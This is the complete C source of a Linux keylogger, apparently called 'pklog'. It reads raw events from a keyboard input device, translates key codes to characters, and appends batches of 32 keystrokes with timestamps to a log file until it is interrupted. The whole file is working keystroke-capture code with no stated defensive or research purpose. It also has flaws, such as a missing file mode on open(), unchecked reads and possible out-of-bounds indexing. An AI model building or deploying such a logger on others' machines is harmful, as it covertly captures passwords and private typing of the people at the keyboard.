#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <linux/input.h>

#define BUFFER_SZ	32
#define STR_TIME_SZ	24

const char *const key_values[84] = {"", "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BCKSPC]", "[TB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "[ENTER]", "[LCTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "´", "`", "[LSHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[RSHIFT]", "*", "[LALT]", " ", "[CAPSLOCK]", "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", "."};

const int key_values_sz[84] = {0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 7, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 6, 1, 10, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 9, 12, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1};

static inline void verify_buffer (void);
static inline void write_buffer (void);
static inline void timestamp (void);
static inline void interrupt ();

/*Globals*/
int infd, outfd;
int buffer_counter;
int buffer[BUFFER_SZ];
struct input_event key;
char first[STR_TIME_SZ];
char last[STR_TIME_SZ];


int main (int argc, char **argv)
{
	const char *input = NULL;
	const char *output = NULL;
	int opt;

	while ( (opt = getopt (argc, argv, "d:o:")) != -1 ) {
		switch (opt) {

		case 'd':
			input = optarg;
			printf ("input: %s\n", input);
			break;
		case 'o':
			output = optarg;
			printf ("output: %s\n", output);
			break;
		}
	}

	if (input  == NULL || output == NULL) {
		printf ("Error: You need to specify the input and output files!\n\t pklog -h for help\n");
		return 0;
	}
	else {
		/* open input */
		infd = open (input, O_RDONLY);

		/* open output */
		outfd = open (output, O_WRONLY | O_CREAT | O_APPEND);
	}

	/* set the interrupt handler*/
	signal (SIGINT, interrupt);

	buffer_counter = 0;

	while (1) {
		read (infd, &key, sizeof(struct input_event));
		if (key.type == 1 && key.value == 1) {
			timestamp ();
			buffer[buffer_counter++] = key.code;
			verify_buffer ();
		}
	}

	close (infd);
	close (outfd);

	return 0;
}

static inline void timestamp ()
{
	if (buffer_counter == 0) {
		memcpy(first, ctime(&key.time.tv_sec), STR_TIME_SZ);
	}
	else {
		memcpy(last, ctime(&key.time.tv_sec), STR_TIME_SZ);
	}
}

static inline void verify_buffer (void)
{
	if (buffer_counter == BUFFER_SZ) {
		write_buffer ();
		buffer_counter = 0;
	}
}

static inline void write_buffer (void)
{
	int i;
	write (outfd, first, STR_TIME_SZ);
	write (outfd, "\n", 1);
	for (i = 0; i < buffer_counter; i++)
		write (outfd, key_values[buffer[i]], key_values_sz[buffer[i]]);	
	write (outfd, "\n", 1);
	write (outfd, last, STR_TIME_SZ);
	write (outfd, "\n\n", 2);
}

static inline void interrupt ()
{
	write_buffer ();
	exit (-1);
}
